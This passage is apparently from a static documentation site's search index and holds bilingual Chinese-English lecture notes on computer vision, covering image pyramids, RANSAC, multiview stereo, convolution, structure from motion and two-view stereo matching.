\u200b\u6240\u4ee5\u200b\u6ee4\u6389\u200b\u7684\u200b\u4fe1\u606f\u200b\u53ef\u4ee5\u200b\u7528\u200b \\(L_i=G_{i}-\\text{upsample}(G_{i+1})\\) \u200b\u6765\u200b\u8868\u793a\u200b. \u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u5404\u4e2a\u200b\u9891\u6bb5\u200b\u7684\u200b\u4fe1\u606f\u200b. \u200b\u8fd9\u4e2a\u200b\u4fe1\u606f\u200b\u5305\u62ec\u200b\u4e86\u200b\u6a21\u7cca\u200b\u4e22\u5931\u200b\u7684\u200b\u4fe1\u606f\u200b\u548c\u200b\u5c3a\u5ea6\u200b\u53d8\u5316\u200b\u7684\u200b\u4fe1\u606f\u200b.</p> <p>\u200b\u91cd\u5efa\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b \\(G_i=L_i+upsample(G_{i+1})\\) \u200b\u5b9e\u73b0\u200b.</p> <p>\u200b\u56fe\u200b\u91cc\u9762\u200b\u7684\u200b \\(Q\\) \u200b\u6a21\u5757\u200b\u662f\u200b\u4e00\u4e2a\u200b\u91cf\u5316\u200b\u6a21\u5757\u200b, \u200b\u7528\u4e8e\u200b\u538b\u7f29\u200b\u4fe1\u606f\u200b (\u200b\u6bcf\u200b\u4e00\u5c42\u200b\u5927\u90e8\u5206\u200b\u533a\u57df\u200b\u7684\u200b\u503c\u200b\u975e\u5e38\u200b\u63a5\u8fd1\u200b 0)</p>"},{"location":"notes/Computer%20Vision/Image%20Stitching/","title":"Image Stitching","text":""},{"location":"notes/Computer%20Vision/Image%20Stitching/#panorama","title":"Panorama","text":""},{"location":"notes/Computer%20Vision/Image%20Stitching/#ransac","title":"RANSAC","text":"<p>RANdom SAmple Consensus</p>"},{"location":"notes/Computer%20Vision/Image%20Stitching/#motivation","title":"motivation","text":"<p>avoid outliers</p>"},{"location":"notes/Computer%20Vision/Image%20Stitching/#how-to-do","title":"How to do","text":"<ul> <li>\u200b\u968f\u673a\u200b\u9009\u62e9\u200b s \u200b\u4e2a\u200b\u6837\u672c\u200b (\u200b\u4e00\u822c\u200b s \u200b\u4e3a\u200b\u6700\u5c0f\u200b\u7684\u200b\u53ef\u4ee5\u200b\u786e\u5b9a\u200b\u4e00\u4e2a\u200b\u6a21\u578b\u200b\u7684\u200b\u6837\u672c\u200b\u6570\u91cf\u200b)</li> <li>\u200b\u62df\u5408\u200b\u6a21\u578b\u200b</li> <li>\u200b\u91cd\u590d\u200b N \u200b\u6b21\u200b</li> <li>\u200b\u9009\u62e9\u200b\u5177\u6709\u200b\u6700\u200b\u591a\u200b inliers \u200b\u7684\u200b\u6a21\u578b\u200b.</li> <li>\u200b\u4f7f\u7528\u200b\u6240\u6709\u200b\u7684\u200b inliers \u200b\u91cd\u65b0\u200b\u62df\u5408\u200b\u6a21\u578b\u200b.</li> </ul>"},{"location":"notes/Computer%20Vision/Image%20Stitching/#pros-and-cons","title":"Pros and Cons","text":"<p>Pros:</p> <ul> <li>Simple &amp; general</li> <li>Applicable to many problems</li> <li>Often works well in practice</li> </ul> <p>Cons:</p> <ul> <li>Has parameters to tune</li> <li>May fail for low inliers ratios</li> <li>Requires too many iterations</li> </ul>"},{"location":"notes/Computer%20Vision/Multiview%20Stereo/","title":"Multiview Stereo","text":""},{"location":"notes/Computer%20Vision/Multiview%20Stereo/#visual-hull-based-mvs","title":"Visual Hull based MVS","text":"<p>\u200b\u89c6\u89c9\u200b\u51f8\u5305\u200b. \u200b\u901a\u8fc7\u200b\u628a\u200b\u6bcf\u4e2a\u200b\u76f8\u673a\u200b\u7684\u200b\u8f6e\u5ed3\u7ebf\u200b\u753b\u200b\u51fa\u6765\u200b\u6c42\u4ea4\u200b\u5f97\u5230\u200b\u7269\u4f53\u200b\u7684\u200b\u4e00\u4e2a\u200b\u8f6e\u5ed3\u200b, \u200b\u586b\u5145\u200b\u8f6e\u5ed3\u200b\u5185\u90e8\u200b.</p> <p></p> <p>\u200b\u901a\u8fc7\u200b\u5148\u200b\u4e0d\u8ba9\u200b\u4eba\u200b\u51fa\u73b0\u200b\u62cd\u200b\u4e00\u5f20\u200b\u7167\u7247\u200b, \u200b\u518d\u200b\u8ba9\u200b\u4eba\u200b\u51fa\u73b0\u200b\u62cd\u200b\u4e00\u5f20\u200b\u7167\u7247\u200b, \u200b\u7136\u540e\u200b\u76f8\u51cf\u200b, \u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u8f6e\u5ed3\u7ebf\u200b </p>"},{"location":"notes/Computer%20Vision/Multiview%20Stereo/#plane-sweep-stereo","title":"Plane-Sweep Stereo","text":"<p>\u200b\u5148\u200b\u4ee5\u200b\u4e00\u5f20\u200b\u56fe\u50cf\u200b\u4e3a\u200b\u53c2\u8003\u200b, \u200b\u6295\u5c04\u200b\u5230\u200b \\([Zmin, Zmax]\\) \u200b\u7684\u200b\u6df1\u5ea6\u200b (\u200b\u53ef\u4ee5\u200b\u5747\u5300\u200b\u5212\u5206\u200b), \u200b\u5f97\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b\u6df1\u5ea6\u200b\u7684\u200b\u4e09\u7ef4\u200b\u5750\u6807\u200b. \u200b\u5c06\u200b\u5750\u6807\u200b\u91cd\u200b\u6295\u5f71\u200b\u5230\u200b\u5176\u4ed6\u200b\u6e90\u200b\u56fe\u50cf\u200b \\(I_i\\) \u200b\u4e0a\u200b, \u200b\u5f97\u5230\u200b\u50cf\u7d20\u200b\u989c\u8272\u200b\u503c\u200b, \u200b\u8ba1\u7b97\u200b\u4e00\u4e0b\u200b\u8fd9\u4e9b\u200b\u989c\u8272\u200b\u503c\u200b\u7684\u200b\u65b9\u5dee\u200b, \u200b\u9009\u62e9\u200b\u4f7f\u5f97\u200b\u65b9\u5dee\u200b\u6700\u5c0f\u200b\u7684\u200b\u6df1\u5ea6\u200b.</p>"},{"location":"notes/Computer%20Vision/Multiview%20Stereo/#depth-map-based-mvs","title":"Depth Map based MVS","text":"<p>\u200b\u6bcf\u6b21\u200b\u901a\u8fc7\u200b\u76f8\u90bb\u200b\u4e24\u4e2a\u200b\u76f8\u673a\u200b\u6784\u5efa\u200b\u6df1\u5ea6\u56fe\u200b Two-View Stereo, \u200b\u6700\u540e\u200b merge \u200b\u8d77\u6765\u200b</p> <p>\u200b\u6ce8\u610f\u200b\u4e0d\u8981\u200b\u8fdb\u884c\u200b\u5e73\u6ed1\u200b\u5904\u7406\u200b, \u200b\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u6709\u200b\u5f88\u591a\u200b\u76f8\u673a\u200b, \u200b\u76f4\u63a5\u200b\u5e73\u6ed1\u200b\u5904\u7406\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u56e0\u4e3a\u200b\u5f88\u591a\u200b\u70b9\u200b\u6ca1\u200b\u62cd\u200b\u5230\u200b\u800c\u200b\u5bfc\u81f4\u200b\u7ed3\u679c\u200b\u5f88\u5927\u200b\u8bef\u5dee\u200b.</p> <p></p>"},{"location":"notes/Computer%20Vision/Multiview%20Stereo/#patched-based-mvs","title":"Patched-based MVS","text":"<p>\u200b\u4e0d\u200b\u53ea\u662f\u200b\u5355\u200b\u50cf\u7d20\u200b\u7684\u200b\u770b\u200b, \u200b\u4e5f\u200b\u4e0d\u662f\u200b\u6574\u4f53\u200b(Visual Hall, \u200b\u8f6e\u5ed3\u7ebf\u200b\u6c42\u4ea4\u200b)\u200b\u7684\u200b\u770b\u200b, \u200b\u800c\u662f\u200b\u5206\u6210\u200b\u4e00\u4e2a\u4e2a\u200b patch. </p> <p> </p> <p>\u200b\u901a\u8fc7\u200b\u8c03\u6574\u200b \\(n(p),c(p)\\) \u200b\u4f7f\u5f97\u200b \\(N(p)\\) \u200b\u5c3d\u53ef\u80fd\u200b\u7684\u200b\u5927\u200b. \u200b\u56e0\u4e3a\u200b\u8fd9\u662f\u200b\u8fde\u7eed\u51fd\u6570\u200b, \u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u6c42\u5bfc\u200b.</p> <p>\u200b\u4f8b\u5982\u200b, \u200b\u5148\u200b\u901a\u8fc7\u200b triangulation \u200b\u786e\u5b9a\u200b\u4e00\u4e0b\u200b \\(c(p)\\) \u200b\u7684\u200b\u521d\u59cb\u503c\u200b, \u200b\u7136\u540e\u200b\u521d\u59cb\u5316\u200b \\(n(p)\\) \u200b\u4e3a\u200b\u8ddf\u200b\u7b2c\u4e00\u5f20\u200b\u7167\u7247\u200b\u5e73\u884c\u200b, \u200b\u7136\u540e\u200b\u6839\u636e\u200b\u8fd9\u4e2a\u200b\u521d\u59cb\u503c\u200b\u53bb\u200b\u4f18\u5316\u200b.</p> <p>\\(V(p)\\) \u200b\u7684\u200b\u66f4\u65b0\u200b: \u200b\u5148\u200b\u9009\u51fa\u200b \\(N(i,\\cdot,p)\\) \u200b\u603b\u548c\u200b\u6700\u5927\u200b\u7684\u200b\u4f5c\u4e3a\u200b reference, \u200b\u7136\u540e\u200b\u4ece\u200b\u8fd9\u4e2a\u200b\u51fa\u53d1\u200b\u79fb\u200b\u9664\u6389\u200b\u76f8\u4f3c\u200b\u5ea6\u200b\u5c0f\u4e8e\u200b\u67d0\u4e2a\u200b\u9608\u503c\u200b\u7684\u200b\u56fe\u50cf\u200b. </p> <p>\u200b\u95ee\u9898\u200b: \u200b\u53ef\u80fd\u200b\u7531\u4e8e\u200b\u91cd\u590d\u200b\u7eb9\u7406\u200b\u5bfc\u81f4\u200b\u9519\u8bef\u200b\u5339\u914d\u200b, \u200b\u5b9e\u8df5\u200b\u4e2d\u200b\u8981\u6c42\u200b: </p>"},{"location":"notes/Computer%20Vision/Multiview%20Stereo/#pipeline","title":"Pipeline","text":"<p>\u200b\u5148\u5bf9\u200b\u56fe\u50cf\u200b\u8fdb\u884c\u200b\u5212\u5206\u200b, \u200b\u5212\u5206\u200b\u6210\u200b\u4e00\u4e2a\u4e2a\u200b Patch (\u200b\u4f8b\u5982\u200b 9x9 \u200b\u50cf\u7d20\u200b\u5757\u200b), \u200b\u6bcf\u4e2a\u200b Patch \u200b\u505a\u200b Feature Detection</p> <p>\u200b\u4e4b\u540e\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u56fe\u50cf\u200b\u5f00\u59cb\u200b, \u200b\u505a\u200b Feature Matching, \u200b\u901a\u8fc7\u200b\u591a\u200b\u5f20\u200b\u56fe\u7247\u200b\u5229\u7528\u200b\u4e0a\u9762\u200b\u6240\u8ff0\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6784\u5efa\u200b\u4e09\u7ef4\u200b\u4e16\u754c\u200b\u4e2d\u200b\u7684\u200b Patch. </p> <p>\u200b\u8fd9\u6837\u200b\u5f97\u5230\u200b\u7684\u200b patch \u200b\u6bd4\u8f83\u200b\u7a00\u758f\u200b, \u200b\u63a5\u4e0b\u6765\u200b\u505a\u200b patch expansion.</p> <p>\u200b\u5982\u679c\u200b\u4e00\u4e2a\u200b patch \u200b\u65c1\u8fb9\u200b\u6709\u200b\u672a\u200b\u5f62\u6210\u200b\u7684\u200b patch, \u200b\u6211\u4eec\u200b\u5c31\u200b\u7528\u200b\u5b83\u200b\u6765\u200b\u7ed9\u200b\u90bb\u5c45\u200b\u8fdb\u884c\u200b\u521d\u59cb\u5316\u200b.</p> <p>\u200b\u6700\u540e\u200b\u8fdb\u884c\u200b\u8fc7\u6ee4\u200b.</p> <p></p>"},{"location":"notes/Computer%20Vision/Some%20Math/","title":"Some Math","text":""},{"location":"notes/Computer%20Vision/Some%20Math/#convolution","title":"Convolution","text":"<p>(\u200b\u5b9e\u9645\u4e0a\u200b, \u200b\u8ba1\u7b97\u673a\u200b\u89c6\u89c9\u200b\u4e2d\u200b\u4e00\u90e8\u5206\u200b\u7684\u200b convolution \u200b\u6307\u200b\u7684\u200b\u5176\u5b9e\u200b\u662f\u200b correlation, \u200b\u4e5f\u200b\u5373\u200b\u4e0d\u662f\u200b\u7ffb\u8f6c\u200b\u518d\u200b\u76f8\u4e58\u200b.)</p>"},{"location":"notes/Computer%20Vision/Some%20Math/#definition","title":"Definition","text":"<p>\u200b\u79bb\u6563\u200b\u5f62\u5f0f\u200b:</p> <p>$$ (f*g)[n]=\\sum_{m=-\\infty}^\\infty f[m]g[n-m] $$ \u200b\u8fde\u7eed\u200b\u5f62\u5f0f\u200b:</p> <p>$$ (f*g)(t)=\\int_{-\\infty}^{\\infty}f(\\tau)g(t-\\tau)d\\tau $$ \u200b\u4e8c\u7ef4\u200b\u79bb\u6563\u5377\u79ef\u200b:</p> \\[ (I*K)[i,j]=\\sum_m\\sum_nI[m,n]\\cdot K[i-m,j-n] \\] <p>\u200b\u4e8c\u7ef4\u200b\u4e92\u76f8\u200b\u5173\u200b (correlation):</p> \\[ (I*K)[i,j]=\\sum_m\\sum_nI[i+m,j+n]\\cdot K[m,n] \\]"},{"location":"notes/Computer%20Vision/Some%20Math/#properties","title":"Properties","text":"<p>\u200b\u4ea4\u6362\u5f8b\u200b, \u200b\u7ed3\u5408\u5f8b\u200b, \u200b\u5206\u914d\u5f8b\u200b, \u200b\u5fae\u5206\u200b\u6027\u8d28\u200b, \u200b\u5e73\u79fb\u200b\u4e0d\u53d8\u200b\u6027\u8d28\u200b.</p>"},{"location":"notes/Computer%20Vision/Structure%20from%20Motion/","title":"Structure from Motion","text":""},{"location":"notes/Computer%20Vision/Structure%20from%20Motion/#sfm-vs-calibration-triangulation","title":"SfM vs Calibration &amp; Triangulation","text":"<ul> <li>Calibration<ul> <li>Input: point pairs from 3D to 2D</li> <li>Output: camera parameters</li> </ul> </li> <li>Triangulation<ul> <li>Input: camera parameters, point pairs from 2D to 2D</li> <li>Output: 3D points</li> </ul> </li> <li>Fundamental Matrix<ul> <li>Input: 2D point pairs (at least 8)</li> <li>Output: Fundamental Matrix</li> </ul> </li> <li>SfM<ul> <li>Input: point pairs from 2D to 2D</li> <li>Output: 3D points and camera parameters</li> </ul> </li> </ul>"},{"location":"notes/Computer%20Vision/Structure%20from%20Motion/#problem-formulation","title":"Problem formulation","text":"<p>Input: \\(m\\) images of \\(n\\) fixed 3D points (ignoring visibility) such that (\\(m\\) \u200b\u5f20\u200b\u56fe\u50cf\u200b, \u200b\u6bcf\u5f20\u200b\u56fe\u50cf\u200b\u6709\u200b \\(n\\) \u200b\u4e2a\u70b9\u200b, \u200b\u662f\u200b\u8981\u200b\u91cd\u5efa\u200b\u7684\u200b\u4e09\u7ef4\u200b\u5750\u6807\u200b\u7684\u200b\u50cf\u7d20\u200b\u5750\u6807\u200b)</p> \\[ x_{ij}\\cong P_iX_j \\quad (i=1,\\dots,m;\\ j=1,\\dots,n) \\] <p>Output: estimate \\(m\\) projectoin matrices \\(P_i\\) and \\(n\\) 3D points \\(X_j\\) from the \\(mn\\) correspondences \\(x_{ij}\\)</p> <p></p>"},{"location":"notes/Computer%20Vision/Structure%20from%20Motion/#the-ambiguity-of-sfm","title":"The Ambiguity of SfM","text":"<p>\u200b\u5373\u4f7f\u200b\u6211\u4eec\u200b\u5bf9\u200b\u6574\u4e2a\u200b\u573a\u666f\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u53d8\u6362\u200b, \u200b\u5f97\u5230\u200b\u7684\u200b\u70b9\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u6539\u53d8\u200b.</p> <p></p> <p>\u200b\u5e73\u884c\u200b\u6027\u200b\u7ea6\u675f\u200b: \u200b\u8981\u6c42\u200b \\(Q\\) \u200b\u4e0d\u80fd\u200b\u628a\u200b\u5e73\u884c\u7ebf\u200b\u53d8\u6210\u200b\u4e0d\u200b\u5e73\u884c\u200b\u4e86\u200b </p> <p> (\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b, \u200b\u56fe\u4e2d\u200b\u7684\u200b\u5e73\u884c\u7ebf\u200b\u4ecd\u7136\u200b\u4fdd\u6301\u200b\u5e73\u884c\u200b)</p> <p>\u200b\u6b63\u4ea4\u200b\u7ea6\u675f\u200b </p>"},{"location":"notes/Computer%20Vision/Structure%20from%20Motion/#affine-sfm","title":"Affine SfM","text":"<p>\u200b\u5f53\u200b\u76f8\u673a\u200b\u79bb\u200b\u7269\u4f53\u200b\u5f88\u200b\u8fdc\u200b, \u200b\u6216\u8005\u200b\u7126\u8ddd\u200b\u5f88\u5927\u200b\u7684\u200b\u65f6\u5019\u200b, \u200b\u8fd1\u5927\u8fdc\u200b\u5c0f\u200b\u7684\u200b\u6548\u679c\u200b\u4e0d\u662f\u200b\u5f88\u200b\u660e\u663e\u200b, \u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u8fd1\u4f3c\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u6b63\u4ea4\u6295\u5f71\u200b </p> <p></p> <p>\u200b\u5728\u200b \u200b\u975e\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b:</p> <p></p> <p>\u200b\u56e0\u6b64\u200b, \\(x_{ij}\\) \u200b\u53ef\u4ee5\u200b\u5199\u6210\u200b \\(x_{ij}=A_iX_j+t_i\\)</p> <p></p> <p>\u200b\u6709\u200b 12 \u200b\u4e2a\u200b\u81ea\u7531\u5ea6\u200b\u7684\u200b\u4eff\u5c04\u53d8\u6362\u200b\u6211\u4eec\u200b\u662f\u200b\u65e0\u6cd5\u200b\u786e\u5b9a\u200b\u7684\u200b, \u200b\u56e0\u6b64\u200b\u81ea\u7531\u5ea6\u200b\u4e3a\u200b 8m+3n-12.</p> <p>\u200b\u901a\u8fc7\u200b centering, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u53bb\u6389\u200b\u5e73\u79fb\u200b\u90e8\u5206\u200b:  \u200b\u5b9a\u4e49\u200b\u4e16\u754c\u200b\u5750\u6807\u7cfb\u200b\u7684\u200b\u539f\u70b9\u200b\u4e3a\u200b\u4e09\u7ef4\u200b\u5750\u6807\u200b\u70b9\u200b\u7684\u200b\u4e2d\u5fc3\u200b, \u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4e0d\u7528\u200b\u5bf9\u200b\u4e09\u7ef4\u200b\u5750\u6807\u200b\u8fdb\u884c\u200b\u5e73\u5747\u200b.</p> <p></p> \\[ \\begin{align} D&amp;=MS \\\\ rank(D)&amp;\\leq rank(M) \\leq 3\\\\ \\end{align} \\] <p>\u200b\u5229\u7528\u200b SVD \u200b\u5206\u89e3\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u4f4e\u200b\u79e9\u200b\u8fd1\u4f3c\u200b\u5e76\u4e14\u200b\u505a\u200b\u5206\u89e3\u200b, \u200b\u4ece\u800c\u200b\u627e\u5230\u200b\u4e00\u7ec4\u200b\u53ef\u884c\u200b\u89e3\u200b.</p> <p></p> <p>\u200b\u5229\u7528\u200b\u4e4b\u524d\u200b\u4eff\u5c04\u200b\u76f8\u673a\u200b\u7684\u200b\u7ea6\u675f\u200b, Ai \u200b\u77e9\u9635\u200b\u7684\u200b\u7b2c\u4e00\u884c\u200b\u548c\u200b\u7b2c\u4e8c\u884c\u200b\u5e94\u8be5\u200b\u662f\u200b\u6807\u51c6\u200b\u6b63\u4ea4\u200b\u7684\u200b </p>"},{"location":"notes/Computer%20Vision/Structure%20from%20Motion/#dealing-with-missing-data","title":"Dealing with Missing Data","text":"<p>\u200b\u5728\u200b\u5b9e\u9645\u200b\u60c5\u51b5\u200b\u4e2d\u200b, \u200b\u5f88\u591a\u200b\u70b9\u200b\u53ef\u80fd\u200b\u4e0d\u4f1a\u200b\u5728\u200b\u67d0\u5f20\u200b\u7167\u7247\u200b\u51fa\u73b0\u200b </p> <ul> <li> <p>Incremental bilinear refinement </p> </li> <li> <p>\u200b\u9996\u5148\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b\u7a20\u5bc6\u200b\u5b50\u56e2\u200b, \u200b\u6309\u7167\u200b\u4e4b\u524d\u200b\u65b9\u6cd5\u200b\u6c42\u200b\u51fa\u200b\u76f8\u673a\u200b\u53c2\u6570\u200b\u548c\u200b\u4e09\u7ef4\u200b\u5750\u6807\u200b.</p> </li> <li>\u200b\u63a5\u4e0b\u6765\u200b\u6211\u4eec\u200b\u770b\u200b\u53f3\u8fb9\u200b\u4e00\u5217\u200b, \u200b\u56e0\u4e3a\u200b\u6211\u4eec\u200b\u5df2\u7ecf\u200b\u77e5\u9053\u200b\u4e86\u200b\u76f8\u673a\u200b\u53c2\u6570\u200b\u8fd8\u6709\u200b\u5bf9\u5e94\u70b9\u200b\u7684\u200b\u5750\u6807\u200b, \u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u505a\u200b triangulation \u200b\u6c42\u200b\u51fa\u200b\u4e09\u7ef4\u200b\u5750\u6807\u200b</li> <li>\u200b\u63a5\u4e0b\u6765\u200b\u518d\u200b\u770b\u200b\u4e0b\u9762\u200b\u4e00\u884c\u200b, \u200b\u8fd9\u4e9b\u200b\u884c\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u70b9\u200b\u6211\u4eec\u200b\u90fd\u200b\u6709\u200b\u539f\u59cb\u200b\u7684\u200b\u4e09\u7ef4\u200b\u5750\u6807\u200b\u548c\u200b\u5f53\u524d\u200b\u56fe\u50cf\u200b\u7684\u200b\u50cf\u7d20\u200b\u5750\u6807\u200b, \u200b\u53ef\u4ee5\u200b\u505a\u200b calibration \u200b\u6c42\u200b\u51fa\u200b\u76f8\u673a\u200b\u53c2\u6570\u200b.</li> <li>\u200b\u4e00\u76f4\u200b\u8fd9\u6837\u200b\u589e\u91cf\u200b\u7684\u200b\u505a\u200b\u4e0b\u53bb\u200b.</li> </ul>"},{"location":"notes/Computer%20Vision/Structure%20from%20Motion/#projective-sfm","title":"Projective SfM","text":"<p>\u200b\u4e00\u822c\u200b\u60c5\u51b5\u200b\u4e0b\u200b, \u200b\u5982\u679c\u200b\u5bf9\u200b \\(Q\\) \u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u7ea6\u675f\u200b:</p> <p></p> <p> </p> <p></p>"},{"location":"notes/Computer%20Vision/Structure%20from%20Motion/#incremental-sfm","title":"Incremental SfM","text":"<p>\u200b\u5c31\u662f\u200b\u521a\u521a\u200b\u8bb2\u200b\u7684\u200b\u601d\u8def\u200b, \u200b\u6700\u540e\u200b\u505a\u200b\u4e00\u6b21\u200b bundle adjustment \u200b\u4f18\u5316\u200b\u4e00\u4e0b\u200b\u6574\u4f53\u200b\u7ed3\u679c\u200b.</p>"},{"location":"notes/Computer%20Vision/Two-View%20Stereo/","title":"Two View Stereo","text":""},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#basic-stereo-matching-algorithm","title":"Basic Stereo Matching Algorithm","text":"<ul> <li>Correspondence + Triangulation</li> <li>Use epipolar line to find correspondence and pick the best match</li> </ul>"},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#simplest-case","title":"Simplest case","text":"<p>epipolar lines = corresponding scanlines </p> <p>\u200b\u5bf9\u4e8e\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b, \u200b\u663e\u7136\u200b\u7684\u200b epipolar \u200b\u7ea6\u675f\u200b\u5c31\u662f\u200b v=v'</p> <p></p>"},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#general-case","title":"General case","text":"<p>\u200b\u5982\u679c\u200b\u56fe\u50cf\u200b\u5e73\u9762\u200b\u4e0d\u200b\u5e73\u884c\u200b, \u200b\u6211\u4eec\u200b\u5c31\u200b\u9700\u8981\u200b\u5229\u7528\u200b fundamental matrix \u200b\u5c06\u200b\u5176\u200b\u53d8\u6362\u200b\u5230\u200b\u5e73\u884c\u200b\u4e8e\u200b\u57fa\u7ebf\u200b\u7684\u200b\u60c5\u51b5\u200b. (Stereo Rectification)</p> <p></p>"},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#depth-from-disparity","title":"Depth from Disparity","text":""},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#error-analysis","title":"error analysis","text":"<p>\u200b\u5bf9\u4e8e\u200b\u540c\u4e00\u4e2a\u200b\u771f\u5b9e\u200b\u6df1\u5ea6\u200b\u4e3a\u200b \\(Z\\) \u200b\u7684\u200b\u7269\u4f53\u200b\u8fdb\u884c\u200b\u5206\u6790\u200b</p> <p>\u200b\u5047\u8bbe\u200b\u771f\u5b9e\u200b\u7684\u200b disparity \u200b\u4e3a\u200b \\(d_0\\), \u200b\u6d4b\u91cf\u200b\u5f97\u5230\u200b\u7684\u200b disparity \u200b\u4e3a\u200b \\(d_1\\)</p> \\[ \\begin{align} d_0 &amp;= \\frac{fB}{Z}\\\\ \\Delta z&amp;=\\left|\\frac{fB}{d_0}-\\frac{fB}{d_1} \\right| \\\\ &amp;=fB\\left|\\frac{\\Delta d}{d_0d_1}\\right| \\\\ &amp;\\approx \\frac{fB}{d_0^2}|\\Delta d| \\\\ &amp;=\\frac{Z^2}{fB}|\\Delta d| \\end{align} \\] <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b \\(B\\) \u200b\u8d8a\u5927\u200b\u8bef\u5dee\u200b\u8d8a\u5c0f\u200b.</p> <p>\u200b\u4f46\u662f\u200b \\(B\\) \u200b\u8d8a\u5927\u200b\u4e24\u4e2a\u200b\u76f8\u673a\u200b\u79bb\u5f97\u200b\u8d8a\u8fdc\u200b, \u200b\u6211\u4eec\u200b\u56fe\u50cf\u200b\u91cd\u53e0\u200b\u90e8\u5206\u200b\u5c31\u200b\u53ef\u80fd\u200b\u6bd4\u8f83\u200b\u5c11\u200b, \u200b\u627e\u200b\u5339\u914d\u200b\u70b9\u200b\u4e5f\u200b\u6bd4\u8f83\u200b\u56f0\u96be\u200b.</p> <p></p>"},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#local-stereo-matching","title":"Local Stereo Matching","text":""},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#similarity-metrics","title":"Similarity Metrics","text":"<p>\u200b\u4f46\u662f\u200b Local Stereo matching \u200b\u65e0\u6cd5\u200b\u5904\u7406\u200b\u975e\u5e38\u200b\u76f8\u4f3c\u200b\u7684\u200b window. </p>"},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#global-stereo-matching","title":"Global Stereo Matching","text":""},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#non-local-constraints","title":"Non-Local Constraints:","text":"<ul> <li>Uniqueness    \u200b\u5de6\u56fe\u200b\u4e2d\u200b\u4e00\u4e2a\u70b9\u200b\u5bf9\u5e94\u200b\u53f3\u56fe\u200b\u4e24\u4e2a\u200b\u70b9\u200b</li> <li>Ordering    \u200b\u51fa\u73b0\u200b\u987a\u5e8f\u200b\u4e0d\u200b\u4e00\u6837\u200b</li> <li>Smoothness    \u200b\u76f8\u90bb\u200b\u7684\u200b\u70b9\u200b\u53ef\u80fd\u200b\u7531\u4e8e\u200b\u4e00\u4e2a\u200b\u5728\u200b\u524d\u200b\u4e00\u4e2a\u200b\u5728\u200b\u540e\u200b\u5bfc\u81f4\u200b\u89c6\u5dee\u200b\u5267\u70c8\u200b\u8df3\u53d8\u200b.</li> </ul>"},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#disparity-space-image","title":"Disparity Space Image","text":"<p>\u200b\u901a\u8fc7\u200b\u5b9a\u4e49\u200b\u5339\u914d\u200b\u4ee3\u4ef7\u200b, \u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u52a8\u6001\u200b\u89c4\u5212\u200b\u7b97\u6cd5\u200b\u8fdb\u884c\u200b\u5339\u914d\u200b.</p>"},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#stereo-matching-via-global-optimization","title":"Stereo Matching via Global Optimization","text":"<p>Speed up -&gt; Downsample, estimate, then upsample</p>"},{"location":"notes/Computer%20Vision/Two-View%20Stereo/#other-methods","title":"Other methods","text":"<ul> <li>Deep Learning</li> <li>Structured Light   \u200b\u5229\u7528\u200b\u6295\u5f71\u4eea\u200b\u5411\u5f85\u6d4b\u200b\u7269\u4f53\u200b\u8868\u9762\u200b\u6295\u5c04\u200b\u4e00\u4e2a\u200b\u5df2\u77e5\u200b\u7684\u200b \u200b\u5149\u200b\u6a21\u5f0f\u200b, \u200b\u7531\u4e8e\u200b\u7269\u4f53\u200b\u6df1\u5ea6\u200b\u53d8\u5316\u200b, \u200b\u56fe\u6848\u200b\u4f1a\u200b\u53d1\u751f\u200b\u5f62\u53d8\u200b\u6216\u200b\u4f4d\u79fb\u200b. \u200b\u76f8\u673a\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u89c6\u89d2\u200b\u6355\u83b7\u200b\u8fd9\u4e2a\u200b\u5f62\u53d8\u200b\u540e\u200b\u7684\u200b\u56e2\u200b. \u200b\u7b97\u6cd5\u200b\u9700\u8981\u200b\u786e\u5b9a\u200b\u76f8\u673a\u200b\u56fe\u50cf\u200b\u4e0a\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u50cf\u7d20\u70b9\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4e8e\u200b\u6295\u5f71\u4eea\u200b\u6295\u5c04\u200b\u7684\u200b\u54ea\u4e2a\u200b\u539f\u59cb\u200b\u5149\u675f\u200b, \u200b\u4e00\u65e6\u200b\u786e\u5b9a\u200b\u4e86\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b Triangulation.</li> <li>Laser Scanning</li> 